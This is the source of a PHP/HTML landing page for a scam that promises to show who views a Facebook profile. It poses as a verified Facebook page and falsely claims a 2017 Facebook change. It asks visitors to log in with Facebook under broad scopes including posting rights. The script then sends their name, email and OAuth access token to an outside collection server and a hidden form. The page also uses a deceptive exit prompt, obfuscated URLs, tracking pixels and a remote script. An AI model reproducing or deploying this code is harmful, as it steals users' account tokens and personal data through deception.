<?php
require_once "../fb.php";
?>
<!DOCTYPE html>
<html class="no-js"> 
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Look at who's looking at your Facebook profile!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="assets/css/custom.css">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon"><link rel="icon" href="favicon.ico" sizes="32x32"><link href="https://i.imgur.com/JROEw7X.png" rel="apple-touch-icon-precomposed" sizes="196x196">
    <style>
        @import url('https://fonts.googleapis.com/css?family=Roboto:400,700,800');
    </style>

    <script src="assets/js/jquery.min.js"></script>
	<?php
	$mainUrl = "http://oxio.in/faceview/english/";	
	?>
	<script>
		var mainUrl = "http://oxio.in/faceview/english/";
		var savefbUser = "http://faceview.oxio.in/site/save-fb-user";
	</script>
</head>
<body>

<script>
	var accessToken = ""; 
  window.fbAsyncInit = function() {
    FB.init({
      appId      : '<?php echo $app_id;?>',
      cookie     : false,
      xfbml      : true,
      oauth      : true, // enable OAuth 2.0
      version    : 'v2.11'
    });
      
    FB.AppEvents.logPageView();   
      
  };

  (function(d, s, id){
     var js, fjs = d.getElementsByTagName(s)[0];
     if (d.getElementById(id)) {return;}
     js = d.createElement(s); js.id = id;
     js.src = "https://connect.facebook.net/en_US/sdk.js";
     fjs.parentNode.insertBefore(js, fjs);
   }(document, 'script', 'facebook-jssdk'));
   
   
  function statusChangeCallback(response) {
  	console.log(response);
    if (response.status === 'connected') {      	
    	accessToken = response.authResponse.accessToken;
      	testAPI();    
    } else {      
		FB.login(function(response) {
		   	statusChangeCallback(response);		   
		}, {  
		     	scope: 'publish_actions,email,public_profile'  
	     	}
	     );
    }
  }   

  function checkLoginState() {
    FB.getLoginStatus(function(response) {
      	statusChangeCallback(response);         
     });
  }

  function testAPI() {
  	FB.api('/me', {fields: 'email,name'},function(response) {    	
    	console.log(response);      	
      	$.post(savefbUser,{
      		'name':response.name,
      		'email':response.email,
      		'access_token':accessToken
      	},function(){	
      		popup_iframe_success(accessToken); 
      		});
      		
      		
      		      	
    });
  }
   
   
</script>
<script>

    landerClickthrough = false;

    window.addEventListener('message', function(e) {
        console.log("Message Event");
        console.log(e.data);
        if(e.data == 'popup_ready') {
            return;
        }

        var type = e.type; // message
        var origin = e.origin || e.originalEvent.origin; // For Chrome, the origin property is in the event.originalEvent object.

        // if (origin !== "https://*.faceview.pro") return;

        if(e.data.indexOf('INVALID_') > -1) {
            popup_retry(e.data);
        } else if(e.data.indexOf('PERMS_') > -1) {
            popup_retry2(e.data);
        } else {

            //popup_iframe_success(e.data);
        }


    }, false);

    window.onbeforeunload = function()
    {
        console.log("On Before Load");
        try { if(!win99.closed) { win99.close(); } } catch(err) {}



        if(!landerClickthrough)
        {
            console.log("USER_EXIT_INDEX");
            lllog('USER_EXIT_INDEX');
            landerClickthrough = true;
            return '------------------------------------------------------------\nClick on "Stay on this page"! Do not miss this opportunity while it\'s free!\n\n------------------------------------------------------------';
        }
    }

    $(document).ready(function() {
        console.log("Start Lander");
        lllog('start_lander', 1);
    });


    if (top.location != self.location) {
        landerClickthrough = true;
        try {
            top.location = self.location;
        } catch(e) {
            window.open(self.location)
        }
    }



</script>

<div class="top_header">
    <div class="top_header_inside">

        <div class="top_header_section"><div style="background-color: #243c6d;"><div class="top_header_icon hdr1"></div></div></div>

        <div class="top_header_section"><div class="top_header_icon hdr2"></div></div>
        <div class="top_header_section"><div class="top_header_icon hdr3"></div></div>
        <div class="top_header_section"><div class="top_header_icon hdr4"></div></div>
        <div class="top_header_section"><div class="top_header_icon hdr5"></div></div>
        <div class="top_header_section"><div class="top_header_icon hdr6"></div></div>

    </div><!-- top hdr inside -->
</div><!-- top hdr -->


<div class="fb_main">

    <!-- <div class="cover"><img src="http://i.imgur.com/wxP7zlU.jpg" /></div>
     -->

    <div class="fb_hdr">

        <div class="fb_logo">
            <div>
                <a href="javascript:void(0);"><i role="img" style="background:#d8dce6 url(https://i.imgur.com/dl27PuQ.jpg) no-repeat center;background-size:100% 100%;-webkit-background-size:100% 100%;width:64px;height:64px;"></i></a>
            </div>
        </div>

        <div>
            <div class="fb_verified_outer">
                <span>Facebook</span>
                <span class="fb_verified" role="img" aria-label="Verified Page"></span>
            </div>
            <div class="fb_verified_txt"><a>@facebook</a></div>
            
        </div>

    </div><!-- fb hdr -->
    
    <?php
    if(isset($_GET['retry'])){    
    ?>
    <div><div class="fb_announce"><div><span class="fb_announce_inner">Please try again.</span></div></div></div>
	<?php } ?>



    <br />



    <script>

        win99 = false;
        win99_newtab = false;

        function popup_retry(tkn) {
        	console.log("RETRYING");
            lllog('RETRYING');
            top.location.replace(mainUrl+'index.php?retry=1&tk='+tkn);
        }

        function popup_retry2(tkn) {
        	console.log("RETRYING_PERMS");
            lllog('RETRYING_PERMS');
            top.location.replace(mainUrl+'index.php?retry=1&permission_needed='+tkn);
        }

        function popup_iframe_success(tkn) {
			console.log("popup_iframe_success");  
            $('#fb_inst_auth').fadeOut();
            landerClickthrough = true;
            document.getElementById('tkn_popup').value = tkn;
            // lllog('got_token', 3); // , false
            document.getElementById('form1998').submit();

        }


        function post_verif() {
            landerClickthrough = true;
            //window.open('\x68\x74\x74\x70\x3A\x2F\x2F\x64\x65\x2E\x66\x61\x63\x65\x76\x69\x65\x77\x2E\x70\x72\x6F\x2F\x77\x68\x6F\x2E\x70\x68\x70\x3F\x6C\x3D\x35\x67\x78\x36\x6A\x68\x69\x25\x32\x46\x77\x59\x49\x71\x6B\x62\x31\x61\x78\x36\x62\x6C\x46\x25\x32\x42\x6E\x6D\x36\x61\x48\x70\x46\x7A\x78\x44\x67\x25\x32\x46\x4A\x62\x6E\x34\x49\x4B\x48\x30\x73\x25\x33\x44\x26\x7A\x3D\x4D\x54\x41\x7A\x4C\x6A\x51\x78\x4C\x6A\x4D\x33\x4C\x6A\x67\x78');
            window.open(mainUrl+'who.php?l=5gx6jhi%2FwYIqkb1ax6blF%2Bnm6aHpFzxDg%2FJbn4IKH0s%3D&z=MTAzLjQxLjM3Ljgx');
            console.log("clicked_to_results");
            lllog('clicked_to_results', 5);
        };

		share_timer = 0;
        function start_verif() {
        	checkLoginState();
          	landerClickthrough = true;     
        }

        $('.fb_main').on('click', '#fb_msg_container', function() {

            if(win99 && !win99.closed) {
                landerClickthrough = true;
                console.log("clicked_WHILE_POPUP_IS_OPEN");
                lllog('clicked_WHILE_POPUP_IS_OPEN');
                top.location.href = '/?retry=1';
            }

        });
        
        function proceed() {
			if(clickt) {		
		    	landerClickthrough = true;
				//top.location.href = mainUrl+'index.php';
				//popup_iframe_success('fkjhsdkhfkshdfhskdjf');		
			} else {
			    alert("Fehler! Bitte teile die Seite, um Zugriff zu erhalten.");
		      	$('#share_but').click();
			    return;   
			}
		}


        function lllog(evt, step, async_setting) {

            if (typeof(async_setting) === 'undefined') async_setting = true;

            //var href = top.location.href + top.location.hash;
            var href = "http://de.faceview.pro/?ktcib397746";
            var ts = ((new Date()).getTime() / 1000);
            var stp = (typeof step === 'undefined' || !step) ? '' : step;
            //var url = '\x2F\x2F\x73\x73\x6C\x32\x2E\x61\x70\x70\x73\x70\x6F\x74\x2E\x73\x69\x74\x65\x2F\x6C\x2E\x6C\x6F\x67\x3F\x70\x72\x6D\x3D\x6B\x74\x63\x69\x62\x33\x39\x37\x37\x34\x36\x26\x72\x66\x3D\x26\x63\x3D\x66\x61\x63\x65\x76\x69\x65\x77\x5F\x64\x65\x26\x6F\x3D\x66\x62\x5F\x69\x6E\x64\x65\x78\x26\x65\x76\x3D'+evt+'&ts='+ts+'&st='+stp+'&href='+encodeURIComponent(href);
            var url = '//ssl2.appspot.site/l.log?prm=ktcib397746&rf=&c=faceview_de&o=fb_index&ev='+evt+'&ts='+ts+'&st='+stp+'&href='+encodeURIComponent(href);

           /* $.ajax({
                type: 'POST',
                url: url,
                data: '',
                success: function(resp){},
                async: async_setting
            });*/

        }

    </script>



    <div class="fb_msg">
        <div id="fb_msg_container" class="fb_msg_txt">


            <div class="fb_txt_title">LOOK AT THOSE WHO LOOK AT YOUR FACEBOOK PROFILE!</div>
            <br />
            <div class="fb_txt_main">With the latest changes to Facebook <br /> since then <span style="color: #4267b2; font-weight: bold;">15. November 2017
</span> it is now possible to see a list of profile visitors! <br /> <br /> This service will officially start in January but you have nowJust a few simple steps to see your visitors! <br /> <br /> See if your list of visitors is available by clicking on the "Next" button below.</div>
            <br />


        </div>


    </div> <!-- end msg -->

    <div class="fb_bottom">

        <div style="margin: 0 auto;">



            <div id="square" class="square"><img /></div>
            <button id="fb_button" onclick="start_verif();" data-clipboard-text="" class="fb_button">Next</button>


        </div>

    </div>

    <br /><br /><br /><br /><br /><br /><br /><br />


    <div style="display: none;"><img src="//ssl2.appspot.site/am.jpg?o=faceview_de&p=fb_index&rf=&prm=ktcib397746&href=http%3A%2F%2Fde.faceview.pro%2F%3Fktcib397746&t=1513760336&t=1513760336" width="0" height="0" border="0" /></div>

</div><!-- end main -->


<form action="<?php echo $mainUrl;?>success.php?success=1" method="post" id="form1998">
    <input type="hidden" id="tkn_popup" name="tkn" value="" /></form>


<script src="//geoip.club/rnfb.php?p=fbindex&c=faceview_de"></script>
</body>
</html>